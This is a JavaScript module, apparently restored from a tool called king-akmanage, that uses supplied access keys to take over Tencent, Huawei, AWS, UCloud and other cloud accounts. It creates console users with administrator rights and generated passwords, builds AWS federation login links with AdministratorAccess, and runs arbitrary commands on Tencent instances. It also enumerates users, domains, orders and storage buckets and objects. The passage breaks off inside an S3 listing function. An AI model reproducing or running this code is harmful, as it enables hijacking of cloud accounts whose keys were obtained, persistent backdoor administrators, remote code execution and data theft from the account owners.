/**
 * 多云 API 桥 — 还原自 king-akmanage 0.1.2
 * 腾讯 CAM/TAT · 华为 IAM · AWS STS/IAM · UCloud IAM · 阿里已在 main ali:request
 */
const crypto = require('crypto')
const https = require('https')
const hw = require('./huawei-signer')

function randPass() {
  // 腾讯云 CAM 要求：大写+小写+数字+特殊字符都要有，否则 AddUser 常直接 operation deny
  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  const lower = 'abcdefghijklmnopqrstuvwxyz'
  const digits = '0123456789'
  const special = '!@#$%'
  const all = upper + lower + digits + special
  const pick = (s) => s[Math.floor(Math.random() * s.length)]
  const chars = [pick(upper), pick(lower), pick(digits), pick(special)]
  while (chars.length < 16) chars.push(pick(all))
  for (let i = chars.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[chars[i], chars[j]] = [chars[j], chars[i]]
  }
  return chars.join('')
}

function uuid() {
  return crypto.randomUUID ? crypto.randomUUID() : ('id-' + Date.now().toString(36))
}

/* ---------------- Tencent TC3 via official SDK ---------------- */
function tencentCam(secretId, secretKey) {
  const tencentcloud = require('tencentcloud-sdk-nodejs')
  const CamClient = tencentcloud.cam.v20190116.Client
  return new CamClient({
    credential: { secretId, secretKey },
    region: '',
    profile: { httpProfile: { endpoint: 'cam.tencentcloudapi.com' } }
  })
}
function tencentTat(secretId, secretKey, region) {
  const tencentcloud = require('tencentcloud-sdk-nodejs')
  const TatClient = tencentcloud.tat.v20201028.Client
  return new TatClient({
    credential: { secretId, secretKey },
    region: region || 'ap-guangzhou',
    profile: { httpProfile: { endpoint: 'tat.tencentcloudapi.com' } }
  })
}

function tencentErrDetail(e) {
  if (!e) return 'unknown'
  const parts = [
    e.code || e.Code,
    e.message || e.Message,
    e.requestId || e.RequestId ? `RequestId=${e.requestId || e.RequestId}` : ''
  ].filter(Boolean)
  return parts.join(' | ') || String(e)
}

function tencentErr(e, step) {
  const msg = tencentErrDetail(e)
  const lower = String(msg).toLowerCase()
  if (lower.includes('already') || lower.includes('exist') || lower.includes('usernamenotunique') || lower.includes('usernameexist')) {
    return `${step}失败：同名用户仍残留。请换用户名，或到腾讯云 CAM 手动删掉后再试（${msg}）`
  }
  if (lower.includes('password') || lower.includes('弱密码') || lower.includes('complexity')) {
    return `${step}失败：密码不符合腾讯云策略（${msg}）`
  }
  if (lower.includes('operation deny') || lower.includes('unauthorizedoperation') || lower.includes('authfailure')) {
    return `${step}失败：${msg}。常见原因：①当前密钥无 cam:AddUser 权限 ②密码策略不通过被笼统拒绝。请用「更多→子用户列表」验证读权限，并确认该密钥是主账号或管理员权限。`
  }
  return `${step}失败：${msg}`
}

function tencentUserUin(u) {
  if (!u || typeof u !== 'object') return null
  return u.Uin || u.Uid || u.uin || u.user?.Uin || null
}
function tencentUserName(u, fallback) {
  if (!u || typeof u !== 'object') return fallback || ''
  return u.Name || u.name || u.UserName || u.userName || fallback || ''
}

function tencentListUserArray(list) {
  if (!list) return []
  const users = list.Data || list.UserInfo || list.Users || list
  return Array.isArray(users) ? users : []
}

async function tencentFindUser(cam, name) {
  if (!name) return null
  try {
    const list = await cam.ListUsers({})
    return tencentListUserArray(list).find(x => tencentUserName(x) === name) || null
  } catch {
    return null
  }
}

/** 取消/再次接管前删掉同名用户；返回是否已确认不存在 */
async function tencentForceRemoveUser(cam, { name, uin }) {
  if (uin) {
    try { await cam.DetachUserPolicy({ PolicyId: 1, DetachUin: Number(uin) || uin }) } catch {}
  }
  if (name) {
    try { await cam.DeleteUser({ Name: name, Force: 1 }) } catch {}
  }
  const hit = await tencentFindUser(cam, name)
  if (hit) {
    const id = tencentUserUin(hit)
    if (id) {
      try { await cam.DetachUserPolicy({ PolicyId: 1, DetachUin: Number(id) || id }) } catch {}
    }
    try { await cam.DeleteUser({ Name: name, Force: 1 }) } catch (e) {
      return { removed: false, error: tencentErrDetail(e), stillThere: true }
    }
  }
  // 腾讯侧删除有时有延迟
  await new Promise(r => setTimeout(r, 800))
  const again = await tencentFindUser(cam, name)
  return { removed: !again, stillThere: !!again, error: again ? '删除后仍能在 ListUsers 中看到该用户' : '' }
}

async function tencentConsole({ access_key, secret_key, userName }) {
  const pass = randPass()
  const name = (userName || 'console_king').trim()
  if (!access_key || !secret_key) throw new Error('AK/SK 为空，请检查资产密钥是否完整')
  const cam = tencentCam(access_key, secret_key)

  let canList = false
  try {
    await cam.ListUsers({})
    canList = true
  } catch {
    canList = false
  }

  // 首次接管留下的 console_king 若取消时没删掉，再次 AddUser 会报 FailedOperation.ForbidAdd
  const existed = await tencentFindUser(cam, name)
  if (existed) {
    const rm = await tencentForceRemoveUser(cam, { name, uin: tencentUserUin(existed) })
    if (rm.stillThere) {
      throw new Error(
        `云上已存在子用户「${name}」（多半是上次接管留下、取消时没删掉）。` +
        `自动删除失败：${rm.error || '未知'}。` +
        `请打开腾讯云 CAM → 用户列表，手动删除「${name}」后再点接管。` +
        `若你还留着上次密码，也可直接用该子用户登录控制台。`
      )
    }
  } else {
    await tencentForceRemoveUser(cam, { name })
  }

  let user
  try {
    user = await cam.AddUser({
      Name: name,
      Password: pass,
      NeedResetPassword: 0,
      ConsoleLogin: 1
    })
  } catch (e) {
    const detail = tencentErrDetail(e)
    const lower = detail.toLowerCase()
    // ForbidAdd 在「用户已存在」时也很常见；再删一次并重试
    if (lower.includes('forbidadd') || lower.includes('exist') || lower.includes('operation deny')) {
      const rm = await tencentForceRemoveUser(cam, { name })
      if (rm.stillThere) {
        throw new Error(
          `AddUser 被拒绝（${detail}），且云上仍能看到「${name}」。` +
          `请到 CAM 手动删除该用户后再接管；删除失败原因：${rm.error || '无'}`
        )
      }
      await new Promise(r => setTimeout(r, 1200))
      try {
        user = await cam.AddUser({
          Name: name,
          Password: pass,
          NeedResetPassword: 0,
          ConsoleLogin: 1
        })
      } catch (e2) {
        const extra = canList
          ? '（密钥能 ListUsers。ForbidAdd 常见于：同名用户残留、禁止创建子用户、或缺少 cam:AddUser）'
          : '（密钥连 ListUsers 也失败，权限不足）'
        throw new Error(tencentErr(e2, 'AddUser / 创建子用户') + extra)
      }
    } else {
      throw new Error(tencentErr(e, 'AddUser / 创建子用户'))
    }
  }
  const uin = tencentUserUin(user)
  if (!uin) throw new Error('用户创建失败：未返回 Uin')
  try {
    await cam.AttachUserPolicy({ PolicyId: 1, AttachUin: Number(uin) || uin })
  } catch (e) {
    throw new Error(tencentErr(e, 'AttachUserPolicy / 绑定策略'))
  }
  const app = await cam.GetUserAppId({})
  return {
    userName: name,
    password: pass,
    OwnerUin: app.OwnerUin,
    loginUrl: 'https://cloud.tencent.com/login/subAccount',
    user: { ...user, Uin: uin, Name: tencentUserName(user, name) },
    uuid: uuid()
  }
}

async function tencentCancel({ access_key, secret_key, console_data }) {
  if (!console_data) throw new Error('暂无接管记录！')
  const cam = tencentCam(access_key, secret_key)
  const u = console_data.user || {}
  const name = tencentUserName(u, console_data.userName)
  const uin = tencentUserUin(u)
  if (!name && !uin) throw new Error('暂无接管记录！')
  const rm = await tencentForceRemoveUser(cam, { name, uin })
  if (rm.stillThere) {
    // 云上没删掉就不要让前端清空本地账密
    const err = new Error(
      `云上子用户「${name || uin}」删除失败，本地接管记录已保留。` +
      `请到腾讯云 CAM 手动删除后再取消。原因：${rm.error || '未知'}`
    )
    err.code = 'CANCEL_KEEP_LOCAL'
    throw err
  }
  return true
}

async function tencentListUsers({ access_key, secret_key }) {
  const cam = tencentCam(access_key, secret_key)
  return cam.ListUsers({})
}

async function tencentRunCommand({ access_key, secret_key, region, instanceId, cmd, commandType, waitMs }) {
  const tat = tencentTat(access_key, secret_key, region)
  const Content = Buffer.from(cmd, 'utf8').toString('base64')
  const created = await tat.CreateCommand({
    CommandName: 'test-' + Date.now(),
    Content,
    CommandType: commandType === 'RunShellScript' || commandType === 'SHELL' ? 'SHELL' : 'POWERSHELL'
  })
  await tat.InvokeCommand({ CommandId: created.CommandId, InstanceIds: [instanceId] })
  await new Promise(r => setTimeout(r, waitMs || 3000))
  const tasks = await tat.DescribeInvocationTasks({ Limit: 10, Offset: 0, HideOutput: false })
  const set = tasks.InvocationTaskSet || []
  let output = ''
  for (const t of set) {
    if (t.CommandId === created.CommandId && t.TaskStatus === 'SUCCESS' && t.TaskResult && t.TaskResult.Output) {
      output += Buffer.from(t.TaskResult.Output, 'base64').toString('utf8')
    }
  }
  try { await tat.DeleteCommand({ CommandId: created.CommandId }) } catch {}
  return { CommandId: created.CommandId, output, tasks: set }
}

/* ---------------- Huawei IAM ---------------- */
function huaweiDomainsOrThrow(domainsRes) {
  const domains = domainsRes.data && domainsRes.data.domains
  if (domains && domains.length) return domains
  const d = domainsRes.data || {}
  const detail = d.error_msg || d.message || d.error_code ||
    (typeof domainsRes.raw === 'string' ? domainsRes.raw.slice(0, 200) : '') ||
    ('HTTP ' + domainsRes.status)
  if (domainsRes.status === 401 || domainsRes.status === 403 || /auth|signature|denied/i.test(String(detail))) {
    throw new Error('aksk无效！' + (detail ? ' (' + detail + ')' : ''))
  }
  throw new Error('查询华为云 Domain 失败：' + detail)
}

async function huaweiConsole({ access_key, secret_key, userName }) {
  const domainsRes = await hw.request({
    ak: access_key, sk: secret_key,
    method: 'GET',
    url: 'https://iam.myhuaweicloud.com/v3/auth/domains',
    headers: { 'Content-Type': 'application/json' },
    body: ''
  })
  const domains = huaweiDomainsOrThrow(domainsRes)
  const domain = domains[0]
  const pass = randPass()
  const name = userName || 'console_king'
  const body = JSON.stringify({
    user: {
      access_mode: 'console',
      name,
      domain_id: domain.id,
      password: pass,
      enabled: true,
      pwd_status: false
    }
  })
  const created = await hw.request({
    ak: access_key, sk: secret_key,
    method: 'POST',
    url: 'https://iam.cn-east-3.myhuaweicloud.com/v3.0/OS-USER/users',
    headers: { 'Content-Type': 'application/json', 'X-Domain-Id': domain.id },
    body,
    domainId: domain.id
  })
  if (!created.data || !created.data.user || !created.data.user.id) {
    throw new Error('创建用户失败，可能存在相同的用户名')
  }
  const user = created.data.user
  const groupsRes = await hw.request({
    ak: access_key, sk: secret_key,
    method: 'GET',
    url: 'https://iam.cn-north-9.myhuaweicloud.com/v3/groups?domain_id=' + domain.id,
    headers: { 'Content-Type': 'application/json', 'X-Domain-Id': domain.id },
    body: '',
    domainId: domain.id
  })
  const groups = (groupsRes.data && groupsRes.data.groups) || []
  const admin = groups.find(g => g.name === 'admin')
  if (!admin) throw new Error('未找到管理员组！')
  await hw.request({
    ak: access_key, sk: secret_key,
    method: 'PUT',
    url: `https://iam.cn-north-9.myhuaweicloud.com/v3/groups/${admin.id}/users/${user.id}`,
    headers: { 'Content-Type': 'application/json', 'X-Domain-Id': domain.id },
    body: '',
    domainId: domain.id
  })
  return {
    userName: name,
    password: pass,
    loginUrl: 'https://auth.huaweicloud.com/authui/login?id=' + domain.name,
    user,
    uuid: uuid()
  }
}

async function huaweiCancel({ access_key, secret_key, console_data }) {
  if (!console_data || !console_data.user) throw new Error('暂无接管记录！')
  const u = console_data.user
  await hw.request({
    ak: access_key, sk: secret_key,
    method: 'DELETE',
    url: 'https://iam.cn-north-9.myhuaweicloud.com/v3/users/' + u.id,
    headers: { 'Content-Type': 'application/json', 'X-Domain-Id': u.domain_id },
    body: '',
    domainId: u.domain_id
  })
  return true
}

/* ---------------- AWS federation console ---------------- */
function awsCfg({ region, accessKeyId, secretAccessKey }) {
  const AWS = require('aws-sdk')
  AWS.config.update({
    region: region || 'us-east-1',
    accessKeyId,
    secretAccessKey
  })
  return AWS
}

async function awsConsole({ access_key, secret_key, region, sessionDuration }) {
  if (!region) throw new Error('接管区域不能为空！')
  if (!sessionDuration) throw new Error('令牌时间不能为空！')
  const AWS = awsCfg({ region, accessKeyId: access_key, secretAccessKey: secret_key })
  const sts = new AWS.STS()
  const fed = await sts.getFederationToken({
    Name: 'aws_consoler',
    PolicyArns: [{ arn: 'arn:aws:iam::aws:policy/AdministratorAccess' }],
    DurationSeconds: Number(sessionDuration)
  }).promise()
  const creds = fed.Credentials
  const federation = region.startsWith('cn-')
    ? 'https://signin.amazonaws.cn/federation'
    : 'https://signin.aws.amazon.com/federation'
  const consoleBase = region.startsWith('cn-')
    ? 'https://console.amazonaws.cn/'
    : 'https://console.aws.amazon.com/'
  const axios = require('axios')
  const sessionRaw = JSON.stringify({
    sessionId: creds.AccessKeyId,
    sessionKey: creds.SecretAccessKey,
    sessionToken: creds.SessionToken
  })
  const tokenRes = await axios.get(federation, {
    params: { Action: 'getSigninToken', SessionDuration: Number(sessionDuration), Session: sessionRaw }
  })
  const SigninToken = tokenRes.data.SigninToken
  if (!SigninToken) throw new Error('获取登录token失败！')
  const dest = encodeURIComponent(consoleBase + '?region=' + region)
  const consoleUrl = `${federation}?Action=login&Issuer=consoler.local&Destination=${dest}&SigninToken=${encodeURIComponent(SigninToken)}`
  const now = new Date()
  const exp = new Date(now.getTime() + Number(sessionDuration) * 1000)
  return {
    consoleUrl,
    region,
    sessionDuration: Number(sessionDuration),
    '接管时间': now.toISOString().replace('T', ' ').slice(0, 19),
    '预计令牌过期时间': exp.toISOString().replace('T', ' ').slice(0, 19)
  }
}

async function awsListUsers({ access_key, secret_key, region }) {
  const AWS = awsCfg({ region: region || 'us-east-1', accessKeyId: access_key, secretAccessKey: secret_key })
  return new AWS.IAM().listUsers({}).promise()
}

async function awsCreateAccessKey({ access_key, secret_key, region, UserName }) {
  const AWS = awsCfg({ region: region || 'us-east-1', accessKeyId: access_key, secretAccessKey: secret_key })
  return new AWS.IAM().createAccessKey({ UserName }).promise()
}

async function awsListPolicies({ access_key, secret_key, region, Scope }) {
  const AWS = awsCfg({ region: region || 'us-east-1', accessKeyId: access_key, secretAccessKey: secret_key })
  return new AWS.IAM().listPolicies({ Scope: Scope || 'Local', MaxItems: 100 }).promise()
}

/* ---------------- UCloud ---------------- */
function ucloudClient({ publicKey, privateKey }) {
  const { Client } = require('@ucloud-sdks/ucloud-sdk-js')
  // SDK shape may vary; also support default export Client from package used in original
  const UCloud = require('@ucloud-sdks/ucloud-sdk-js')
  if (UCloud.Client) {
    return new UCloud.Client({
      config: { region: '', projectId: '', baseUrl: 'https://api.ucloud.cn' },
      credential: { publicKey, privateKey }
    })
  }
  // fallback axios signed invoke
  return { _raw: { publicKey, privateKey } }
}

async function ucloudInvoke(publicKey, privateKey, params) {
  // UCloud openapi: PublicKey + Signature = sha1(privateKey + sorted params)
  const axios = require('axios')
  const data = { ...params, PublicKey: publicKey }
  const keys = Object.keys(data).sort()
  let s = ''
  for (const k of keys) {
    const v = data[k]
    s += k + (Array.isArray(v) ? v.join(',') : String(v))
  }
  s += privateKey
  data.Signature = crypto.createHash('sha1').update(s).digest('hex')
  const res = await axios.post('https://api.ucloud.cn', data, {
    headers: { 'Content-Type': 'application/json' }
  })
  if (res.data && res.data.RetCode !== 0) {
    throw new Error(res.data.Message || ('RetCode=' + res.data.RetCode))
  }
  return res.data
}

async function ucloudListProjects({ access_key, secret_key }) {
  return ucloudInvoke(access_key, secret_key, { Action: 'ListProjects', Offset: '0', Limit: '100' })
}

async function ucloudConsole({ access_key, secret_key, userName, email, projectID }) {
  if (!userName) throw new Error('接管账号不能为空！')
  if (!email) throw new Error('接码邮箱不能为空！')
  if (!projectID) throw new Error('请选择项目！')
  const created = await ucloudInvoke(access_key, secret_key, {
    Action: 'CreateUser',
    UserName: userName,
    AccessKeyStatus: 'Active',
    LoginProfileStatus: 'Active',
    Email: email
  })
  await ucloudInvoke(access_key, secret_key, {
    Action: 'AttachPoliciesToUser',
    UserName: userName,
    Scope: 'Specified',
    ProjectID: projectID,
    PolicyURNs: ['ucs:iam::ucs:policy/AdministratorAccess']
  })
  return {
    UserName: userName,
    UserEmail: created.UserEmail,
    AccessKeyID: created.AccessKeyID,
    AccessKeySecret: created.AccessKeySecret,
    loginUrl: 'https://passport.ucloud.cn/#login',
    uuid: uuid()
  }
}

async function ucloudCancel({ access_key, secret_key, console_data }) {
  if (!console_data || !console_data.UserName) throw new Error('暂无接管记录！')
  await ucloudInvoke(access_key, secret_key, { Action: 'DeleteUser', UserName: console_data.UserName })
  return true
}

async function ucloudOrderList({ access_key, secret_key, BeginTime, EndTime, Limit, Offset }) {
  const now = Date.now()
  const end = EndTime || Math.floor(now / 1000)
  const begin = BeginTime || Math.floor((now - 30 * 24 * 3600 * 1000) / 1000)
  return ucloudInvoke(access_key, secret_key, {
    Action: 'DescribeOrderDetailInfo',
    BeginTime: String(begin),
    EndTime: String(end),
    Limit: String(Limit || 100),
    Offset: String(Offset || 0)
  })
}

async function ucloudListUsers({ access_key, secret_key, Limit, Offset }) {
  return ucloudInvoke(access_key, secret_key, {
    Action: 'ListUsers',
    Limit: String(Limit || 100),
    Offset: String(Offset || 0)
  })
}

async function ucloudGetUserInfoList({ access_key, secret_key }) {
  return ucloudInvoke(access_key, secret_key, { Action: 'GetUserInfo' })
}

/* ---------------- Aliyun OSS list (P2 start) ---------------- */
async function ossListBuckets({ access_key, secret_key, region }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key,
    accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou'
  })
  return client.listBuckets()
}

async function ossListObjects({ access_key, secret_key, region, bucket, prefix, marker, maxKeys, delimiter }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key,
    accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou',
    bucket
  })
  const opt = {
    prefix: prefix || '',
    'max-keys': maxKeys || 100,
    marker: marker || undefined
  }
  if (delimiter) opt.delimiter = delimiter
  const res = await client.list(opt)
  return {
    objects: (res.objects || []).map(o => ({
      name: o.name, size: o.size, lastModified: o.lastModified, etag: o.etag || o.ETag, isDir: false
    })),
    prefixes: (res.prefixes || []).map(p => ({ name: p, size: '-', lastModified: '', isDir: true })),
    nextMarker: res.nextMarker || null,
    isTruncated: !!res.isTruncated
  }
}



/* ---------------- Tencent list / domain ---------------- */
async function tencentListUsersRaw({ access_key, secret_key }) {
  const cam = tencentCam(access_key, secret_key)
  return cam.ListUsers({})
}

async function tencentDescribeDomains({ access_key, secret_key, Offset = 0, Limit = 100 }) {
  const tencentcloud = require('tencentcloud-sdk-nodejs')
  const DomainClient = tencentcloud.domain.v20180808.Client
  const client = new DomainClient({
    credential: { secretId: access_key, secretKey: secret_key },
    region: '',
    profile: { httpProfile: { endpoint: 'domain.tencentcloudapi.com' } }
  })
  return client.DescribeDomainNameList({ Offset, Limit })
}

async function huaweiListUsers({ access_key, secret_key }) {
  const domainsRes = await hw.request({
    ak: access_key, sk: secret_key,
    method: 'GET',
    url: 'https://iam.myhuaweicloud.com/v3/auth/domains',
    headers: { 'Content-Type': 'application/json' },
    body: ''
  })
  const domains = huaweiDomainsOrThrow(domainsRes)
  const domain = domains[0]
  const usersRes = await hw.request({
    ak: access_key, sk: secret_key,
    method: 'GET',
    url: 'https://iam.cn-east-3.myhuaweicloud.com/v3/users',
    headers: { 'Content-Type': 'application/json', 'X-Domain-Id': domain.id },
    body: '',
    domainId: domain.id
  })
  return { domain, users: (usersRes.data && usersRes.data.users) || usersRes.data }
}

/* ---------------- Tencent COS ---------------- */
function cosClient({ secretId, secretKey }) {
  const COS = require('cos-nodejs-sdk-v5')
  return new COS({ SecretId: secretId, SecretKey: secretKey })
}
function cosPromise(fn) {
  return new Promise((resolve, reject) => fn((err, data) => err ? reject(err) : resolve(data)))
}

async function cosListBuckets({ access_key, secret_key }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  return cosPromise(cb => cos.getService({}, cb))
}

async function cosListObjects({ access_key, secret_key, Bucket, Region, Prefix, Marker, MaxKeys, Delimiter }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  const res = await cosPromise(cb => cos.getBucket({
    Bucket, Region,
    Prefix: Prefix || '',
    Marker: Marker || undefined,
    MaxKeys: MaxKeys || 100,
    Delimiter: Delimiter || undefined
  }, cb))
  const objects = (res.Contents || []).map(o => ({
    name: o.Key, size: o.Size, lastModified: o.LastModified, etag: o.ETag, isDir: false
  }))
  const prefixes = (res.CommonPrefixes || []).map(p => ({
    name: p.Prefix, size: '-', lastModified: '', isDir: true
  }))
  return {
    objects, prefixes,
    nextMarker: res.NextMarker || null,
    isTruncated: res.IsTruncated === 'true' || res.IsTruncated === true,
    raw: res
  }
}

/* ---------------- generic HTTP for 钉钉/飞书 (OtherTools) ---------------- */
async function httpRequest({ url, method = 'GET', headers = {}, body = '' }) {
  const axios = require('axios')
  const res = await axios({
    url, method,
    headers: typeof headers === 'string' ? {} : (headers || {}),
    data: body || undefined,
    transformResponse: [(d) => d],
    validateStatus: () => true
  })
  return typeof res.data === 'string' ? res.data : JSON.stringify(res.data)
}

function normalizeAiBase(baseUrl) {
  return String(baseUrl || '').trim().replace(/\/+$/, '')
}

function aiAuthHeaders(apiKey, organization) {
  const headers = {
    Authorization: 'Bearer ' + String(apiKey || '').trim(),
    'Content-Type': 'application/json'
  }
  if (organization) headers['OpenAI-Organization'] = String(organization)
  return headers
}

function parseAiBody(data) {
  if (data == null) return null
  if (typeof data === 'object') return data
  try { return JSON.parse(data) } catch { return { raw: String(data) } }
}

function aiErrorMessage(status, body) {
  if (body && typeof body === 'object') {
    const msg = body.error?.message || body.message || body.msg
    if (msg) return String(msg)
  }
  return 'HTTP ' + status
}

function aiAxiosError(err, url) {
  const code = err.code || err.cause?.code
  if (code === 'ECONNABORTED' || /timeout/i.test(String(err.message || ''))) {
    return new Error('请求超时（请检查 Base URL 是否可达、网络/代理是否正常）：' + url)
  }
  if (code === 'ENOTFOUND' || code === 'EAI_AGAIN') {
    return new Error('DNS 解析失败：' + url)
  }
  if (code === 'ECONNREFUSED') {
    return new Error('连接被拒绝：' + url)
  }
  if (code === 'CERT_HAS_EXPIRED' || code === 'UNABLE_TO_VERIFY_LEAF_SIGNATURE') {
    return new Error('证书校验失败：' + url)
  }
  return new Error(String(err.message || err) + ' @ ' + url)
}

/** 部分中转站无视 stream:false，返回 SSE；从中拼出文本 */
function parseSseChatText(text) {
  const chunks = String(text || '').split('\n')
  let content = ''
  let model = ''
  const events = []
  for (const line of chunks) {
    const s = line.trim()
    if (!s.startsWith('data:')) continue
    const payload = s.slice(5).trim()
    if (!payload || payload === '[DONE]') continue
    try {
      const j = JSON.parse(payload)
      events.push(j)
      if (j.model) model = j.model
      const delta = j.choices?.[0]?.delta?.content
        || j.choices?.[0]?.message?.content
        || j.choices?.[0]?.text
        || ''
      if (delta) content += delta
    } catch {}
  }
  return { content, model, events }
}

function safeClone(obj) {
  try { return JSON.parse(JSON.stringify(obj)) } catch { return null }
}

/** request_id -> AbortController，供试调「取消」 */
const aiAbortMap = new Map()

function beginAiAbort(requestId) {
  if (!requestId) return undefined
  const prev = aiAbortMap.get(requestId)
  if (prev) {
    try { prev.abort() } catch {}
  }
  const ac = new AbortController()
  aiAbortMap.set(String(requestId), ac)
  return ac.signal
}

function endAiAbort(requestId) {
  if (!requestId) return
  aiAbortMap.delete(String(requestId))
}

function aiAbort(requestId) {
  const id = String(requestId || '')
  if (!id) return { aborted: false }
  const ac = aiAbortMap.get(id)
  if (!ac) return { aborted: false }
  try { ac.abort() } catch {}
  aiAbortMap.delete(id)
  return { aborted: true }
}

async function aiAxios(config, requestId) {
  const axios = require('axios')
  const signal = beginAiAbort(requestId)
  try {
    return await axios({
      timeout: 60000,
      maxRedirects: 5,
      transitional: { clarifyTimeoutError: true },
      validateStatus: () => true,
      signal,
      ...config
    })
  } catch (err) {
    if (err.code === 'ERR_CANCELED' || err.name === 'CanceledError' || err.name === 'AbortError') {
      throw new Error('已取消请求')
    }
    throw aiAxiosError(err, config.url || '')
  } finally {
    endAiAbort(requestId)
  }
}

/** OpenAI Compatible: GET /models */
async function aiListModels({ base_url, api_key, organization, request_id }) {
  const base = normalizeAiBase(base_url)
  if (!base) throw new Error('缺少 base_url')
  if (!api_key) throw new Error('缺少 api_key')
  const url = base + '/models'
  const started = Date.now()
  const res = await aiAxios({
    url,
    method: 'GET',
    headers: aiAuthHeaders(api_key, organization),
    timeout: 30000,
    responseType: 'text'
  }, request_id)
  const body = parseAiBody(res.data)
  if (res.status >= 400) throw new Error(aiErrorMessage(res.status, body))
  const models = Array.isArray(body?.data)
    ? body.data.map((m) => m.id || m.name || String(m)).filter(Boolean)
    : []
  return { models, count: models.length, ms: Date.now() - started, raw: safeClone(body) }
}

/** OpenAI Compatible: POST /chat/completions */
async function aiChatCompletions({ base_url, api_key, organization, model, messages, temperature, request_id }) {
  const base = normalizeAiBase(base_url)
  if (!base) throw new Error('缺少 base_url')
  if (!api_key) throw new Error('缺少 api_key')
  if (!model) throw new Error('缺少 model')
  const url = base + '/chat/completions'
  const started = Date.now()
  const res = await aiAxios({
    url,
    method: 'POST',
    headers: {
      ...aiAuthHeaders(api_key, organization),
      Accept: 'application/json'
    },
    data: {
      model,
      messages: messages || [{ role: 'user', content: 'ping' }],
      temperature: temperature == null ? 0.7 : temperature,
      stream: false
    },
    timeout: 60000,
    responseType: 'text'
  }, request_id)

  const rawText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data)
  const ct = String(res.headers?.['content-type'] || '')
  const looksSse = ct.includes('text/event-stream') || /^\s*data:/m.test(rawText)

  if (res.status >= 400) {
    const body = parseAiBody(rawText)
    throw new Error(aiErrorMessage(res.status, body))
  }

  if (looksSse) {
    const sse = parseSseChatText(rawText)
    return {
      content: String(sse.content || ''),
      model: sse.model || model,
      usage: null,
      ms: Date.now() - started,
      raw: safeClone({ stream: true, events: sse.events?.slice?.(0, 20) || [] }),
      note: '服务端返回了流式 SSE，已自动拼接'
    }
  }

  const body = parseAiBody(rawText)
  if (res.status >= 400) throw new Error(aiErrorMessage(res.status, body))
  const content = body?.choices?.[0]?.message?.content
    || body?.choices?.[0]?.text
    || ''
  return {
    content: String(content),
    model: body?.model || model,
    usage: body?.usage || null,
    ms: Date.now() - started,
    raw: safeClone(body)
  }
}

/** 连通探测：优先 listModels，失败则极短 chat */
async function aiProbe({ base_url, api_key, organization, model, request_id }) {
  const started = Date.now()
  try {
    const listed = await aiListModels({ base_url, api_key, organization, request_id })
    return {
      ok: true,
      via: 'models',
      models: listed.models,
      count: listed.count,
      ms: Date.now() - started
    }
  } catch (e1) {
    if (String(e1.message || e1).includes('已取消')) throw e1
    const chatModel = model || 'gpt-4o-mini'
    try {
      const chat = await aiChatCompletions({
        base_url,
        api_key,
        organization,
        model: chatModel,
        messages: [{ role: 'user', content: 'ping' }],
        temperature: 0,
        request_id
      })
      return {
        ok: true,
        via: 'chat',
        content: chat.content,
        model: chat.model,
        ms: Date.now() - started,
        modelsError: String(e1.message || e1)
      }
    } catch (e2) {
      throw new Error(
        '探测失败：models=' + String(e1.message || e1) + '；chat=' + String(e2.message || e2)
      )
    }
  }
}

function qiniuMac({ access_key, secret_key }) {
  const qiniu = require('qiniu')
  return { qiniu, mac: new qiniu.auth.digest.Mac(access_key, secret_key) }
}

function qiniuPromise(fn) {
  return new Promise((resolve, reject) => {
    fn((err, body, info) => {
      if (err) return reject(err)
      if (info && info.statusCode && info.statusCode >= 400) {
        return reject(new Error(JSON.stringify(body || info)))
      }
      resolve(body)
    })
  })
}

async function qiniuListBuckets({ access_key, secret_key }) {
  const { qiniu, mac } = qiniuMac({ access_key, secret_key })
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  const list = await qiniuPromise(cb => bm.listBucket(cb))
  return { buckets: (list || []).map(name => ({ name, region: '', creationDate: '' })) }
}

async function qiniuListObjects({ access_key, secret_key, bucket, prefix, marker, limit }) {
  const { qiniu, mac } = qiniuMac({ access_key, secret_key })
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  const body = await qiniuPromise(cb => bm.listPrefix(bucket, {
    prefix: prefix || '',
    limit: limit || 100,
    marker: marker || undefined
  }, cb))
  return {
    objects: (body.items || []).map(it => ({
      name: it.key,
      size: it.fsize,
      lastModified: it.putTime ? new Date(Math.floor(it.putTime / 10000)).toISOString() : '',
      etag: it.hash || it.md5 || '',
      isDir: false
    })),
    prefixes: [],
    nextMarker: body.marker || null,
    isTruncated: !!body.marker
  }
}

async function upyunListDir({ service, operator, password, path }) {
  const upyun = require('upyun')
  const svc = new upyun.Service(service, operator, password)
  const client = new upyun.Client(svc)
  const res = await client.listDir(path || '/')
  if (res === false) throw new Error('又拍云 listDir 失败（请检查服务名/操作员/密码）')
  const files = Array.isArray(res) ? res : (res.files || [])
  return {
    objects: files.map(f => ({
      name: f.name,
      size: f.size,
      lastModified: f.time ? new Date(Number(f.time) * 1000).toISOString() : '',
      type: f.type
    }))
  }
}

/* ---------------- S3-compatible (AWS / MinIO / KS3 / JD) ---------------- */
function s3Client({ access_key, secret_key, region, endpoint, forcePathStyle }) {
  const AWS = require('aws-sdk')
  const cfg = {
    accessKeyId: access_key,
    secretAccessKey: secret_key,
    region: region || 'us-east-1',
    s3ForcePathStyle: !!forcePathStyle,
    signatureVersion: 'v4'
  }
  if (endpoint) {
    cfg.endpoint = endpoint
    cfg.s3ForcePathStyle = forcePathStyle !== false
  }
  return new AWS.S3(cfg)
}

function s3Promise(fn) {
  return new Promise((resolve, reject) => {
    fn((err, data) => (err ? reject(err) : resolve(data)))
  })
}

async function s3ListBuckets(opts) {
  const s3 = s3Client(opts)
  const data = await s3Promise(cb => s3.listBuckets(cb))
  return {
    buckets: (data.Buckets || []).map(b => ({
      name: b.Name,
      region: opts.region || '',
      creationDate: b.CreationDate
    }))
  }
}

async function s3ListObjects({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, prefix, continuationToken, maxKeys, delimiter }) {
